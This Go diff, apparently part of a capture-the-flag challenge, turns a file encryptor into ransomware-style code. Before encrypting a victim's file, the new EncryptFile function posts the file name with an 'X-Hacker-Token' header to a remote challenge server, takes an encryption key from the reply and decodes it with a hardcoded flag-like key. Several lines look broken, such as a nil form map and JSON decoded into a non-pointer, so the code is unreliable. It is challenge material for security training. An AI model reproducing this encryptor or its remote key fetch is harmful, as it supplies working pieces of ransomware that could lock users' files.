@@ -5,15 +5,24 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"io"
+	"net/http"
 	"os"
 	"path/filepath"
 )
 
+type receivedtoken struct {
+	token string
+}
+
 func Decryptkey(data string) string {
 	ct, _ := base64.StdEncoding.DecodeString(data)
-	block, _ := aes.NewCipher([]byte("Y3Rme2szeV8zbmNyeXA3XzFuZ19rM3l9"))
+
+	key := "dWFoe2szeV8zbmNyeXA3XzFuZ19rM3l9"
+	decoded_key, _ := base64.StdEncoding.DecodeString(key)
+	block, _ := aes.NewCipher([]byte(decoded_key))
 
 	if len(ct) < aes.BlockSize {
 		return ""
@@ -28,7 +37,7 @@ func Decryptkey(data string) string {
 	return string(ct)
 }
 
-func Encrypt(file string) string {
+func EncryptFile(file string) string {
 	data, err := os.ReadFile(file)
 	bytes := []byte(data)
 
@@ -36,9 +45,20 @@ func Encrypt(file string) string {
 		panic(nil)
 	}
 
-	key := []byte("Y3Rme2szeV8zbmNyeXA3XzFuZ19rM3l9")
+	client := http.Client{}
+	req, _ := http.NewRequest("POST", "http://chal.ctf.uahcyber.club:5502", nil)
+	req.Header.Set("X-Hacker-Token", "jo7aiXieShaephaevi4Ohvengiey0kah")
+	req.Form.Add("file", file)
+	res, err := client.Do(req)
 
-	block, err := aes.NewCipher(key)
+	if err != nil {
+		return ""
+	}
+	encoded_key := receivedtoken{}
+	json.NewDecoder(res.Body).Decode(encoded_key)
+	decoded_key := Decryptkey(encoded_key.token)
+	
+	block, err := aes.NewCipher([]byte(decoded_key))
 	ct := make([]byte, aes.BlockSize+len(bytes))
 	iv := ct[:aes.BlockSize]
 	io.ReadFull(rand.Reader, iv)
